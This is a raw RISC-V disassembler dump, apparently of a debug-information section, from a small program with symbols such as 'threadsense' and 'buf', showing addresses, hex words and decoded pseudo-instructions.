     848:	8e08                	.2byte	0x8e08
     84a:	0001                	.2byte	0x1
     84c:	0200                	.2byte	0x200
     84e:	075c0c6f          	jal	s8,c10c2 <threadsense.2+0xc103e>
     852:	0000                	.2byte	0x0
     854:	7de89103          	lh	sp,2014(a7)
     858:	7002                	.2byte	0x7002
     85a:	0200736f          	jal	t1,787a <threadsense.2+0x77f6>
     85e:	0770                	.2byte	0x770
     860:	004a                	.2byte	0x4a
     862:	0000                	.2byte	0x0
     864:	9102                	.2byte	0x9102
     866:	006c                	.2byte	0x6c
     868:	6012                	.2byte	0x6012
     86a:	0000                	.2byte	0x0
     86c:	6c00                	.2byte	0x6c00
     86e:	13000007          	.4byte	0x13000007
     872:	007a                	.2byte	0x7a
     874:	0000                	.2byte	0x0
     876:	751b003f 5e000003 	.8byte	0x5e000003751b003f
     87e:	7780                	.2byte	0x7780
     880:	8000                	.2byte	0x8000
     882:	0000                	.2byte	0x0
     884:	0000                	.2byte	0x0
     886:	00b8                	.2byte	0xb8
     888:	0000                	.2byte	0x0
     88a:	0000                	.2byte	0x0
     88c:	0000                	.2byte	0x0
     88e:	9c01                	.2byte	0x9c01
     890:	07b2                	.2byte	0x7b2
     892:	0000                	.2byte	0x0
     894:	02007803          	.4byte	0x2007803
     898:	185e                	.2byte	0x185e
     89a:	008d                	.2byte	0x8d
     89c:	0000                	.2byte	0x0
     89e:	9102                	.2byte	0x9102
     8a0:	0248                	.2byte	0x248
     8a2:	00727473          	csrrc	s0,0x7,4
     8a6:	6002                	.2byte	0x6002
     8a8:	b208                	.2byte	0xb208
     8aa:	02000007          	.4byte	0x2000007
     8ae:	5891                	.2byte	0x5891
     8b0:	6902                	.2byte	0x6902
     8b2:	0200                	.2byte	0x200
     8b4:	0761                	.2byte	0x761
     8b6:	004a                	.2byte	0x4a
     8b8:	0000                	.2byte	0x0
     8ba:	9102                	.2byte	0x9102
     8bc:	006c                	.2byte	0x6c
     8be:	cf12                	.2byte	0xcf12
     8c0:	0000                	.2byte	0x0
     8c2:	c200                	.2byte	0xc200
     8c4:	13000007          	.4byte	0x13000007
     8c8:	007a                	.2byte	0x7a
     8ca:	0000                	.2byte	0x0
     8cc:	0010                	.2byte	0x10
     8ce:	8611                	.2byte	0x8611
     8d0:	0001                	.2byte	0x1
     8d2:	0300                	.2byte	0x300
     8d4:	05dc                	.2byte	0x5dc
     8d6:	004a                	.2byte	0x4a
     8d8:	0000                	.2byte	0x0
     8da:	76ec                	.2byte	0x76ec
     8dc:	8000                	.2byte	0x8000
     8de:	0000                	.2byte	0x0
     8e0:	0000                	.2byte	0x0
     8e2:	0094                	.2byte	0x94
     8e4:	0000                	.2byte	0x0
     8e6:	0000                	.2byte	0x0
     8e8:	0000                	.2byte	0x0
     8ea:	9c01                	.2byte	0x9c01
     8ec:	0000080b          	.4byte	0x80b
     8f0:	00686303          	lwu	t1,6(a6)
     8f4:	4e02                	.2byte	0x4e02
     8f6:	4a11                	.2byte	0x4a11
     8f8:	0000                	.2byte	0x0
     8fa:	0200                	.2byte	0x200
     8fc:	6c91                	.2byte	0x6c91
     8fe:	66756227          	.4byte	0x66756227
     902:	0200                	.2byte	0x200
     904:	1850                	.2byte	0x1850
     906:	0000080b          	.4byte	0x80b
     90a:	1c40                	.2byte	0x1c40
     90c:	00000163          	beqz	zero,90e <threadsense.2+0x88a>
     910:	5102                	.2byte	0x5102
     912:	004a                	.2byte	0x4a
     914:	0000                	.2byte	0x0
     916:	1200                	.2byte	0x1200
     918:	000000cf          	fnmadd.s	ft1,ft0,ft0,ft0,rne
     91c:	0000081b          	sext.w	a6,zero
     920:	00007a13          	and	s4,zero,0
     924:	3f00                	.2byte	0x3f00
     926:	1b00                	.2byte	0x1b00
     928:	0171                	.2byte	0x171
     92a:	0000                	.2byte	0x0
     92c:	9839                	.2byte	0x9839
     92e:	0076                	.2byte	0x76
     930:	0080                	.2byte	0x80
     932:	0000                	.2byte	0x0
     934:	5400                	.2byte	0x5400
     936:	0000                	.2byte	0x0
     938:	0000                	.2byte	0x0
     93a:	0000                	.2byte	0x0
     93c:	0100                	.2byte	0x100
     93e:	459c                	.2byte	0x459c
     940:	0008                	.2byte	0x8
     942:	0300                	.2byte	0x300
     944:	39020073          	.4byte	0x39020073
     948:	0000db1b          	srlw	s6,ra,0x0
     94c:	0200                	.2byte	0x200
     94e:	5891                	.2byte	0x5891
     950:	2800                	.2byte	0x2800
     952:	0000026f          	jal	tp,952 <threadsense.2+0x8ce>
     956:	3402                	.2byte	0x3402
     958:	8006                	.2byte	0x8006
     95a:	0076                	.2byte	0x76
     95c:	0080                	.2byte	0x80
     95e:	0000                	.2byte	0x0
     960:	1800                	.2byte	0x1800
     962:	0000                	.2byte	0x0
     964:	0000                	.2byte	0x0
     966:	0000                	.2byte	0x0
     968:	0100                	.2byte	0x100
     96a:	299c                	.2byte	0x299c
     96c:	02ae                	.2byte	0x2ae
     96e:	0000                	.2byte	0x0
     970:	2f02                	.2byte	0x2f02
     972:	5c06                	.2byte	0x5c06
     974:	0076                	.2byte	0x76
     976:	0080                	.2byte	0x80
     978:	0000                	.2byte	0x0
     97a:	2400                	.2byte	0x2400
     97c:	0000                	.2byte	0x0
     97e:	0000                	.2byte	0x0
     980:	0000                	.2byte	0x0
     982:	0100                	.2byte	0x100
     984:	8d9c                	.2byte	0x8d9c
     986:	0008                	.2byte	0x8
     988:	0100                	.2byte	0x100
     98a:	029a                	.2byte	0x29a
     98c:	0000                	.2byte	0x0
     98e:	2f02                	.2byte	0x2f02
     990:	00004a0f          	.4byte	0x4a0f
     994:	0200                	.2byte	0x200
     996:	6c91                	.2byte	0x6c91
     998:	1100                	.2byte	0x1100
     99a:	01a0                	.2byte	0x1a0
     99c:	0000                	.2byte	0x0
     99e:	2a02                	.2byte	0x2a02
     9a0:	9e21                	.2byte	0x9e21
     9a2:	0000                	.2byte	0x0
     9a4:	3800                	.2byte	0x3800
     9a6:	0076                	.2byte	0x76
     9a8:	0080                	.2byte	0x80
     9aa:	0000                	.2byte	0x0
     9ac:	2400                	.2byte	0x2400
     9ae:	0000                	.2byte	0x0
     9b0:	0000                	.2byte	0x0
     9b2:	0000                	.2byte	0x0
     9b4:	0100                	.2byte	0x100
     9b6:	dd9c                	.2byte	0xdd9c
     9b8:	0008                	.2byte	0x8
     9ba:	0100                	.2byte	0x100
     9bc:	0000024f          	fnmadd.s	ft4,ft0,ft0,ft0,rne
     9c0:	2a02                	.2byte	0x2a02
     9c2:	00009e37          	lui	t3,0x9
     9c6:	0200                	.2byte	0x200
     9c8:	6891                	.2byte	0x6891
     9ca:	63706503          	lwu	a0,1591(zero) # 637 <threadsense.2+0x5b3>
     9ce:	0200                	.2byte	0x200
     9d0:	482a                	.2byte	0x482a
     9d2:	009e                	.2byte	0x9e
     9d4:	0000                	.2byte	0x0
     9d6:	9102                	.2byte	0x9102
     9d8:	0160                	.2byte	0x160
     9da:	037e                	.2byte	0x37e
     9dc:	0000                	.2byte	0x0
     9de:	2a02                	.2byte	0x2a02
     9e0:	00033157          	.4byte	0x33157
     9e4:	0200                	.2byte	0x200
     9e6:	5891                	.2byte	0x5891
     9e8:	2a00                	.2byte	0x2a00
     9ea:	000002a7          	.4byte	0x2a7
     9ee:	2402                	.2byte	0x2402
     9f0:	0820                	.2byte	0x820
     9f2:	0076                	.2byte	0x76
     9f4:	0080                	.2byte	0x80
     9f6:	0000                	.2byte	0x0
     9f8:	3000                	.2byte	0x3000
     9fa:	0000                	.2byte	0x0
     9fc:	0000                	.2byte	0x0
     9fe:	0000                	.2byte	0x0
     a00:	0100                	.2byte	0x100
     a02:	0b9c                	.2byte	0xb9c
     a04:	0009                	.2byte	0x9
     a06:	0100                	.2byte	0x100
     a08:	029a                	.2byte	0x29a
     a0a:	0000                	.2byte	0x0
     a0c:	2402                	.2byte	0x2402
     a0e:	9e36                	.2byte	0x9e36
     a10:	0000                	.2byte	0x0
     a12:	0200                	.2byte	0x200
     a14:	6891                	.2byte	0x6891
     a16:	0a00                	.2byte	0xa00
     a18:	029f 0000 1202      	.byte	0x9f, 0x02, 0x00, 0x00, 0x02, 0x12
     a1e:	9e12                	.2byte	0x9e12
     a20:	0000                	.2byte	0x0
     a22:	6400                	.2byte	0x6400
     a24:	0075                	.2byte	0x75
     a26:	0080                	.2byte	0x80
     a28:	0000                	.2byte	0x0
     a2a:	a400                	.2byte	0xa400
     a2c:	0000                	.2byte	0x0
     a2e:	0000                	.2byte	0x0
     a30:	0000                	.2byte	0x0
     a32:	0100                	.2byte	0x100
     a34:	7e9c                	.2byte	0x7e9c
     a36:	0009                	.2byte	0x9
     a38:	0100                	.2byte	0x100
     a3a:	036a                	.2byte	0x36a
     a3c:	0000                	.2byte	0x0
     a3e:	1202                	.2byte	0x1202
     a40:	9e24                	.2byte	0x9e24
     a42:	0000                	.2byte	0x0
     a44:	0300                	.2byte	0x300
     a46:	f891                	.2byte	0xf891
     a48:	017e                	.2byte	0x17e
     a4a:	034d                	.2byte	0x34d
     a4c:	0000                	.2byte	0x0
     a4e:	1202                	.2byte	0x1202
     a50:	8d34                	.2byte	0x8d34
     a52:	0000                	.2byte	0x0
     a54:	0300                	.2byte	0x300
     a56:	f091                	.2byte	0xf091
     a58:	017e                	.2byte	0x17e
     a5a:	0352                	.2byte	0x352
     a5c:	0000                	.2byte	0x0
     a5e:	1202                	.2byte	0x1202
     a60:	00008d43          	fmadd.s	fs10,ft1,ft0,ft0,rne
     a64:	0300                	.2byte	0x300
     a66:	e891                	.2byte	0xe891
     a68:	017e                	.2byte	0x17e
     a6a:	01f5                	.2byte	0x1f5
     a6c:	0000                	.2byte	0x0
     a6e:	1202                	.2byte	0x1202
     a70:	8d52                	.2byte	0x8d52
     a72:	0000                	.2byte	0x0
     a74:	0300                	.2byte	0x300
     a76:	e091                	.2byte	0xe091
     a78:	2b7e                	.2byte	0x2b7e
     a7a:	000002b3          	add	t0,zero,zero
     a7e:	1402                	.2byte	0x1402
     a80:	8e15                	.2byte	0x8e15
     a82:	0009                	.2byte	0x9
     a84:	4000                	.2byte	0x4000
     a86:	7f02                	.2byte	0x7f02
     a88:	0000                	.2byte	0x0
     a8a:	9912                	.2byte	0x9912
     a8c:	0000                	.2byte	0x0
     a8e:	8e00                	.2byte	0x8e00
     a90:	0009                	.2byte	0x9
     a92:	1300                	.2byte	0x1300
     a94:	007a                	.2byte	0x7a
     a96:	0000                	.2byte	0x0
     a98:	7e0e0007          	.4byte	0x7e0e0007
     a9c:	0009                	.2byte	0x9
     a9e:	0a00                	.2byte	0xa00
     aa0:	02e4                	.2byte	0x2e4
     aa2:	0000                	.2byte	0x0
     aa4:	7801                	.2byte	0x7801
     aa6:	8d11                	.2byte	0x8d11
     aa8:	0000                	.2byte	0x0
     aaa:	1800                	.2byte	0x1800
     aac:	0075                	.2byte	0x75
     aae:	0080                	.2byte	0x80
     ab0:	0000                	.2byte	0x0
     ab2:	4c00                	.2byte	0x4c00
     ab4:	0000                	.2byte	0x0
     ab6:	0000                	.2byte	0x0
     ab8:	0000                	.2byte	0x0
     aba:	0100                	.2byte	0x100
     abc:	d29c                	.2byte	0xd29c
     abe:	0009                	.2byte	0x9
     ac0:	0300                	.2byte	0x300
     ac2:	0078                	.2byte	0x78
     ac4:	7801                	.2byte	0x7801
     ac6:	8d21                	.2byte	0x8d21
     ac8:	0000                	.2byte	0x0
     aca:	0200                	.2byte	0x200
     acc:	5891                	.2byte	0x5891
     ace:	1608                	.2byte	0x1608
     ad0:	0002                	.2byte	0x2
     ad2:	0100                	.2byte	0x100
     ad4:	0c7a                	.2byte	0xc7a
     ad6:	008d                	.2byte	0x8d
     ad8:	0000                	.2byte	0x0
     ada:	9102                	.2byte	0x9102
     adc:	0068                	.2byte	0x68
     ade:	650a                	.2byte	0x650a
     ae0:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     ae4:	1172                	.2byte	0x1172
     ae6:	008d                	.2byte	0x8d
     ae8:	0000                	.2byte	0x0
     aea:	74cc                	.2byte	0x74cc
     aec:	8000                	.2byte	0x8000
     aee:	0000                	.2byte	0x0
     af0:	0000                	.2byte	0x0
     af2:	004c                	.2byte	0x4c
     af4:	0000                	.2byte	0x0
     af6:	0000                	.2byte	0x0
     af8:	0000                	.2byte	0x0
     afa:	9c01                	.2byte	0x9c01
     afc:	0a11                	.2byte	0xa11
     afe:	0000                	.2byte	0x0
     b00:	01007803          	.4byte	0x1007803
     b04:	1f72                	.2byte	0x1f72
     b06:	008d                	.2byte	0x8d
     b08:	0000                	.2byte	0x0
     b0a:	9102                	.2byte	0x9102
     b0c:	0258                	.2byte	0x258
     b0e:	6962                	.2byte	0x6962
     b10:	0074                	.2byte	0x74
     b12:	7401                	.2byte	0x7401
     b14:	8d0c                	.2byte	0x8d0c
     b16:	0000                	.2byte	0x0
     b18:	0200                	.2byte	0x200
     b1a:	6891                	.2byte	0x6891
     b1c:	1d00                	.2byte	0x1d00
     b1e:	01ed                	.2byte	0x1ed
     b20:	0000                	.2byte	0x0
     b22:	275e                	.2byte	0x275e
     b24:	7424                	.2byte	0x7424
     b26:	8000                	.2byte	0x8000
     b28:	0000                	.2byte	0x0
     b2a:	0000                	.2byte	0x0
     b2c:	00a8                	.2byte	0xa8
     b2e:	0000                	.2byte	0x0
     b30:	0000                	.2byte	0x0
     b32:	0000                	.2byte	0x0
     b34:	9c01                	.2byte	0x9c01
     b36:	0a75                	.2byte	0xa75
     b38:	0000                	.2byte	0x0
     b3a:	0901                	.2byte	0x901
     b3c:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
     b40:	335e                	.2byte	0x335e
     b42:	004a                	.2byte	0x4a
     b44:	0000                	.2byte	0x0
     b46:	9102                	.2byte	0x9102
     b48:	086c                	.2byte	0x86c
     b4a:	033e                	.2byte	0x33e
     b4c:	0000                	.2byte	0x0
     b4e:	6001                	.2byte	0x6001
     b50:	00005117          	auipc	sp,0x5
     b54:	0900                	.2byte	0x900
     b56:	00100403          	lb	s0,1(zero) # 1 <threadsense.5+0x1>
     b5a:	0080                	.2byte	0x80
     b5c:	0000                	.2byte	0x0
     b5e:	0800                	.2byte	0x800
     b60:	031a                	.2byte	0x31a
     b62:	0000                	.2byte	0x0
     b64:	6101                	.2byte	0x6101
     b66:	00005117          	auipc	sp,0x5
     b6a:	0900                	.2byte	0x900
     b6c:	00100003          	lb	zero,1(zero) # 1 <threadsense.5+0x1>
     b70:	0080                	.2byte	0x80
     b72:	0000                	.2byte	0x0
     b74:	1c00                	.2byte	0x1c00
     b76:	0338                	.2byte	0x338
     b78:	0000                	.2byte	0x0
     b7a:	6201                	.2byte	0x6201
     b7c:	004a                	.2byte	0x4a
     b7e:	0000                	.2byte	0x0
     b80:	0a00                	.2byte	0xa00
     b82:	0262                	.2byte	0x262
     b84:	0000                	.2byte	0x0
     b86:	4e01                	.2byte	0x4e01
     b88:	4a0c                	.2byte	0x4a0c
     b8a:	0000                	.2byte	0x0
     b8c:	9c00                	.2byte	0x9c00
     b8e:	0072                	.2byte	0x72
     b90:	0080                	.2byte	0x80
     b92:	0000                	.2byte	0x0
     b94:	8800                	.2byte	0x8800
     b96:	0001                	.2byte	0x1
     b98:	0000                	.2byte	0x0
     b9a:	0000                	.2byte	0x0
     b9c:	0100                	.2byte	0x100
     b9e:	3b9c                	.2byte	0x3b9c
     ba0:	0300000b          	.4byte	0x300000b
     ba4:	006e                	.2byte	0x6e
     ba6:	4e01                	.2byte	0x4e01
     ba8:	4a1d                	.2byte	0x4a1d
     baa:	0000                	.2byte	0x0
     bac:	0300                	.2byte	0x300
     bae:	bc91                	.2byte	0xbc91
     bb0:	017f 0295 0000 4e01 	.byte	0x7f, 0x01, 0x95, 0x02, 0x00, 0x00, 0x01, 0x4e, 0x37, 0x3b
     bb8:	3b37 
     bba:	0300000b          	.4byte	0x300000b
     bbe:	b091                	.2byte	0xb091
     bc0:	017f 016a 0000 4e01 	.byte	0x7f, 0x01, 0x6a, 0x01, 0x00, 0x00, 0x01, 0x4e, 0x4b, 0x51
     bc8:	514b 
     bca:	0300000b          	.4byte	0x300000b
     bce:	a891                	.2byte	0xa891
     bd0:	027f 0069 5001 4a07 	.byte	0x7f, 0x02, 0x69, 0x00, 0x01, 0x50, 0x07, 0x4a, 0x00, 0x00
     bd8:	0000 
     bda:	0200                	.2byte	0x200
     bdc:	6c91                	.2byte	0x6c91
     bde:	c010                	.2byte	0xc010
     be0:	0072                	.2byte	0x72
     be2:	0080                	.2byte	0x80
     be4:	0000                	.2byte	0x0
     be6:	cc00                	.2byte	0xcc00
     be8:	0000                	.2byte	0x0
     bea:	0000                	.2byte	0x0
     bec:	0000                	.2byte	0x0
     bee:	0200                	.2byte	0x200
     bf0:	3074                	.2byte	0x3074
     bf2:	0100                	.2byte	0x100
     bf4:	0c54                	.2byte	0xc54
     bf6:	0b40                	.2byte	0xb40
     bf8:	0000                	.2byte	0x0
     bfa:	9102                	.2byte	0x9102
     bfc:	0260                	.2byte	0x260
     bfe:	3174                	.2byte	0x3174
     c00:	0100                	.2byte	0x100
     c02:	1a54                	.2byte	0x1a54
     c04:	0b40                	.2byte	0xb40
     c06:	0000                	.2byte	0x0
     c08:	9102                	.2byte	0x9102
     c0a:	0258                	.2byte	0x258
     c0c:	3076                	.2byte	0x3076
     c0e:	0100                	.2byte	0x100
     c10:	0c55                	.2byte	0xc55
     c12:	0b40                	.2byte	0xb40
     c14:	0000                	.2byte	0x0
     c16:	9102                	.2byte	0x9102
     c18:	0250                	.2byte	0x250
     c1a:	3176                	.2byte	0x3176
     c1c:	0100                	.2byte	0x100
     c1e:	1c55                	.2byte	0x1c55
     c20:	0b40                	.2byte	0xb40
     c22:	0000                	.2byte	0x0
     c24:	9102                	.2byte	0x9102
     c26:	0248                	.2byte	0x248
     c28:	7165                	.2byte	0x7165
     c2a:	0031                	.2byte	0x31
     c2c:	5601                	.2byte	0x5601
     c2e:	4a09                	.2byte	0x4a09
     c30:	0000                	.2byte	0x0
     c32:	0200                	.2byte	0x200
     c34:	4491                	.2byte	0x4491
     c36:	6502                	.2byte	0x6502
     c38:	3271                	.2byte	0x3271
     c3a:	0100                	.2byte	0x100
     c3c:	1956                	.2byte	0x1956
     c3e:	004a                	.2byte	0x4a
     c40:	0000                	.2byte	0x0
     c42:	9102                	.2byte	0x9102
     c44:	0040                	.2byte	0x40
     c46:	0600                	.2byte	0x600
     c48:	0b4c                	.2byte	0xb4c
     c4a:	0000                	.2byte	0x0
     c4c:	57040807          	.4byte	0x57040807
     c50:	0c000003          	lb	zero,192(zero) # c0 <threadsense.2+0x3c>
     c54:	0b40                	.2byte	0xb40
     c56:	0000                	.2byte	0x0
     c58:	470e                	.2byte	0x470e
     c5a:	0600000b          	.4byte	0x600000b
     c5e:	00000b47          	fmsub.s	fs6,ft0,ft0,ft0,rne
     c62:	6a0a                	.2byte	0x6a0a
     c64:	0001                	.2byte	0x1
     c66:	0100                	.2byte	0x100
     c68:	0c3e                	.2byte	0xc3e
     c6a:	004a                	.2byte	0x4a
     c6c:	0000                	.2byte	0x0
     c6e:	7124                	.2byte	0x7124
     c70:	8000                	.2byte	0x8000
     c72:	0000                	.2byte	0x0
     c74:	0000                	.2byte	0x0
     c76:	0178                	.2byte	0x178
     c78:	0000                	.2byte	0x0
     c7a:	0000                	.2byte	0x0
     c7c:	0000                	.2byte	0x0
     c7e:	9c01                	.2byte	0x9c01
     c80:	0bfc                	.2byte	0xbfc
     c82:	0000                	.2byte	0x0
     c84:	01006e03          	lwu	t3,16(zero) # 10 <threadsense.5+0x10>
     c88:	173e                	.2byte	0x173e
     c8a:	004a                	.2byte	0x4a
     c8c:	0000                	.2byte	0x0
     c8e:	9102                	.2byte	0x9102
     c90:	014c                	.2byte	0x14c
     c92:	0295                	.2byte	0x295
     c94:	0000                	.2byte	0x0
     c96:	3e01                	.2byte	0x3e01
     c98:	fc2e                	.2byte	0xfc2e
     c9a:	0200000b          	.4byte	0x200000b
     c9e:	4091                	.2byte	0x4091
     ca0:	6a01                	.2byte	0x6a01
     ca2:	0001                	.2byte	0x1
     ca4:	0100                	.2byte	0x100
     ca6:	3f3e                	.2byte	0x3f3e
     ca8:	0c01                	.2byte	0xc01
     caa:	0000                	.2byte	0x0
     cac:	7fb89103          	lh	sp,2043(a7)
     cb0:	6902                	.2byte	0x6902
     cb2:	0100                	.2byte	0x100
     cb4:	0740                	.2byte	0x740
     cb6:	004a                	.2byte	0x4a
     cb8:	0000                	.2byte	0x0
     cba:	9102                	.2byte	0x9102
     cbc:	106c                	.2byte	0x106c
     cbe:	7148                	.2byte	0x7148
     cc0:	8000                	.2byte	0x8000
     cc2:	0000                	.2byte	0x0
     cc4:	0000                	.2byte	0x0
     cc6:	00b8                	.2byte	0xb8
     cc8:	0000                	.2byte	0x0
     cca:	0000                	.2byte	0x0
     ccc:	0000                	.2byte	0x0
     cce:	7402                	.2byte	0x7402
     cd0:	0030                	.2byte	0x30
     cd2:	4401                	.2byte	0x4401
     cd4:	4a09                	.2byte	0x4a09
     cd6:	0000                	.2byte	0x0
     cd8:	0200                	.2byte	0x200
     cda:	6891                	.2byte	0x6891
     cdc:	7402                	.2byte	0x7402
     cde:	0031                	.2byte	0x31
     ce0:	4401                	.2byte	0x4401
     ce2:	00004a17          	auipc	s4,0x4
     ce6:	0200                	.2byte	0x200
     ce8:	6491                	.2byte	0x6491
     cea:	7602                	.2byte	0x7602
     cec:	0030                	.2byte	0x30
     cee:	4501                	.2byte	0x4501
     cf0:	4a09                	.2byte	0x4a09
     cf2:	0000                	.2byte	0x0
     cf4:	0200                	.2byte	0x200
     cf6:	6091                	.2byte	0x6091
     cf8:	7602                	.2byte	0x7602
     cfa:	0031                	.2byte	0x31
     cfc:	4501                	.2byte	0x4501
     cfe:	4a19                	.2byte	0x4a19
     d00:	0000                	.2byte	0x0
     d02:	0200                	.2byte	0x200
     d04:	5c91                	.2byte	0x5c91
     d06:	0000                	.2byte	0x0
     d08:	5606                	.2byte	0x5606
     d0a:	0000                	.2byte	0x0
     d0c:	0600                	.2byte	0x600
     d0e:	0000005b          	.4byte	0x5b
     d12:	c11d                	.2byte	0xc11d
     d14:	0001                	.2byte	0x1
     d16:	3300                	.2byte	0x3300
     d18:	f80d                	.2byte	0xf80d
     d1a:	0070                	.2byte	0x70
     d1c:	0080                	.2byte	0x80
     d1e:	0000                	.2byte	0x0
     d20:	2c00                	.2byte	0x2c00
     d22:	0000                	.2byte	0x0
     d24:	0000                	.2byte	0x0
     d26:	0000                	.2byte	0x0
     d28:	0100                	.2byte	0x100
     d2a:	4f9c                	.2byte	0x4f9c
     d2c:	000c                	.2byte	0xc
     d2e:	0100                	.2byte	0x100
     d30:	024a                	.2byte	0x24a
     d32:	0000                	.2byte	0x0
     d34:	3301                	.2byte	0x3301
     d36:	db29                	.2byte	0xdb29
     d38:	0000                	.2byte	0x0
     d3a:	0200                	.2byte	0x200
     d3c:	6891                	.2byte	0x6891
     d3e:	01006e03          	lwu	t3,16(zero) # 10 <threadsense.5+0x10>
     d42:	004a3533          	sltu	a0,s4,tp
     d46:	0000                	.2byte	0x0
     d48:	9102                	.2byte	0x9102
     d4a:	0364                	.2byte	0x364
     d4c:	7261                	.2byte	0x7261
     d4e:	0072                	.2byte	0x72
     d50:	3301                	.2byte	0x3301
     d52:	5145                	.2byte	0x5145
     d54:	0200000b          	.4byte	0x200000b
     d58:	5891                	.2byte	0x5891
     d5a:	2c00                	.2byte	0x2c00
     d5c:	01e2                	.2byte	0x1e2
     d5e:	0000                	.2byte	0x0
     d60:	2801                	.2byte	0x2801
     d62:	cc0d                	.2byte	0xcc0d
     d64:	0070                	.2byte	0x70
     d66:	0080                	.2byte	0x80
     d68:	0000                	.2byte	0x0
     d6a:	2c00                	.2byte	0x2c00
     d6c:	0000                	.2byte	0x0
     d6e:	0000                	.2byte	0x0
     d70:	0000                	.2byte	0x0
     d72:	0100                	.2byte	0x100
     d74:	019c                	.2byte	0x19c
     d76:	024a                	.2byte	0x24a
     d78:	0000                	.2byte	0x0
     d7a:	2801                	.2byte	0x2801
     d7c:	0000db23          	.4byte	0xdb23
     d80:	0200                	.2byte	0x200
     d82:	6891                	.2byte	0x6891
     d84:	01006e03          	lwu	t3,16(zero) # 10 <threadsense.5+0x10>
     d88:	2f28                	.2byte	0x2f28
     d8a:	004a                	.2byte	0x4a
     d8c:	0000                	.2byte	0x0
     d8e:	9102                	.2byte	0x9102
     d90:	0364                	.2byte	0x364
     d92:	7261                	.2byte	0x7261
     d94:	0072                	.2byte	0x72
     d96:	2801                	.2byte	0x2801
     d98:	013c                	.2byte	0x13c
     d9a:	000c                	.2byte	0xc
     d9c:	0200                	.2byte	0x200
     d9e:	5891                	.2byte	0x5891
     da0:	0000                	.2byte	0x0
     da2:	01a4                	.2byte	0x1a4
     da4:	0000                	.2byte	0x0
     da6:	0005                	.2byte	0x5
     da8:	0801                	.2byte	0x801
     daa:	0389                	.2byte	0x389
     dac:	0000                	.2byte	0x0
     dae:	7d06                	.2byte	0x7d06
     db0:	0000                	.2byte	0x0
     db2:	0c00                	.2byte	0xc00
     db4:	0000019b          	sext.w	gp,zero
     db8:	0000                	.2byte	0x0
     dba:	0000                	.2byte	0x0
     dbc:	8538                	.2byte	0x8538
     dbe:	8000                	.2byte	0x8000
     dc0:	0000                	.2byte	0x0
     dc2:	0000                	.2byte	0x0
     dc4:	02ac                	.2byte	0x2ac
     dc6:	0000                	.2byte	0x0
     dc8:	0000                	.2byte	0x0
     dca:	0000                	.2byte	0x0
     dcc:	0000120b          	.4byte	0x120b
     dd0:	0101                	.2byte	0x101
     dd2:	7106                	.2byte	0x7106
     dd4:	0000                	.2byte	0x0
     dd6:	0200                	.2byte	0x200
     dd8:	0050                	.2byte	0x50
     dda:	0000                	.2byte	0x0
     ddc:	2b02                	.2byte	0x2b02
     dde:	4118                	.2byte	0x4118
     de0:	0000                	.2byte	0x0
     de2:	0100                	.2byte	0x100
     de4:	0801                	.2byte	0x801
     de6:	0000006f          	j	de6 <threadsense.2+0xd62>
     dea:	0201                	.2byte	0x201
     dec:	2e05                	.2byte	0x2e05
     dee:	0001                	.2byte	0x1
     df0:	0100                	.2byte	0x100
     df2:	0702                	.2byte	0x702
     df4:	0000011b          	sext.w	sp,zero
     df8:	69050407          	.4byte	0x69050407
     dfc:	746e                	.2byte	0x746e
     dfe:	0100                	.2byte	0x100
     e00:	0704                	.2byte	0x704
     e02:	0288                	.2byte	0x288
     e04:	0000                	.2byte	0x0
     e06:	0801                	.2byte	0x801
     e08:	0d05                	.2byte	0xd05
     e0a:	0002                	.2byte	0x2
     e0c:	0200                	.2byte	0x200
     e0e:	02d4                	.2byte	0x2d4
     e10:	0000                	.2byte	0x0
     e12:	6902                	.2byte	0x6902
     e14:	7719                	.2byte	0x7719
     e16:	0000                	.2byte	0x0
     e18:	0100                	.2byte	0x100
     e1a:	0708                	.2byte	0x708
     e1c:	00000283          	lb	t0,0(zero) # 0 <threadsense.5>
     e20:	5a02                	.2byte	0x5a02
     e22:	0000                	.2byte	0x0
     e24:	0200                	.2byte	0x200
     e26:	1ae8                	.2byte	0x1ae8
     e28:	00000077          	.4byte	0x77
     e2c:	5202                	.2byte	0x5202
     e2e:	0000                	.2byte	0x0
     e30:	0300                	.2byte	0x300
     e32:	1318                	.2byte	0x1318
     e34:	0035                	.2byte	0x35
     e36:	0000                	.2byte	0x0
     e38:	d602                	.2byte	0xd602
     e3a:	0002                	.2byte	0x2
     e3c:	0300                	.2byte	0x300
     e3e:	143c                	.2byte	0x143c
     e40:	0000006b          	.4byte	0x6b
     e44:	5c02                	.2byte	0x5c02
     e46:	0000                	.2byte	0x0
     e48:	0300                	.2byte	0x300
     e4a:	1552                	.2byte	0x1552
     e4c:	007e                	.2byte	0x7e
     e4e:	0000                	.2byte	0x0
     e50:	b802                	.2byte	0xb802
     e52:	04000003          	lb	zero,64(zero) # 40 <buf.4>
     e56:	1718                	.2byte	0x1718
     e58:	00000077          	.4byte	0x77
     e5c:	8a04                	.2byte	0x8a04
     e5e:	0000                	.2byte	0x0
     e60:	c500                	.2byte	0xc500
     e62:	0000                	.2byte	0x0
     e64:	0800                	.2byte	0x800
     e66:	0300                	.2byte	0x300
     e68:	039d                	.2byte	0x39d
     e6a:	0000                	.2byte	0x0
     e6c:	ba1f 0000 0300      	.byte	0x1f, 0xba, 0x00, 0x00, 0x00, 0x03
     e72:	000003a3          	sb	zero,7(zero) # 7 <threadsense.5+0x7>
     e76:	ba20                	.2byte	0xba20
     e78:	0000                	.2byte	0x0
     e7a:	0300                	.2byte	0x300
     e7c:	03a9                	.2byte	0x3a9
     e7e:	0000                	.2byte	0x0
     e80:	ba21                	.2byte	0xba21
     e82:	0000                	.2byte	0x0
     e84:	0300                	.2byte	0x300
     e86:	000003af          	.4byte	0x3af
     e8a:	ba22                	.2byte	0xba22
     e8c:	0000                	.2byte	0x0
     e8e:	0300                	.2byte	0x300
     e90:	013d                	.2byte	0x13d
     e92:	0000                	.2byte	0x0
     e94:	0000ba23          	sd	zero,20(ra)
     e98:	0400                	.2byte	0x400
     e9a:	00ae                	.2byte	0xae
     e9c:	0000                	.2byte	0x0
     e9e:	010e                	.2byte	0x10e
     ea0:	0000                	.2byte	0x0
     ea2:	7709                	.2byte	0x7709
     ea4:	0000                	.2byte	0x0
     ea6:	0300                	.2byte	0x300
     ea8:	770a                	.2byte	0x770a
     eaa:	0000                	.2byte	0x0
     eac:	ff00                	.2byte	0xff00
     eae:	0001                	.2byte	0x1
     eb0:	0074700b          	.4byte	0x74700b
     eb4:	2601                	.2byte	0x2601
     eb6:	0000f707          	.4byte	0xf707
     eba:	0000                	.2byte	0x0
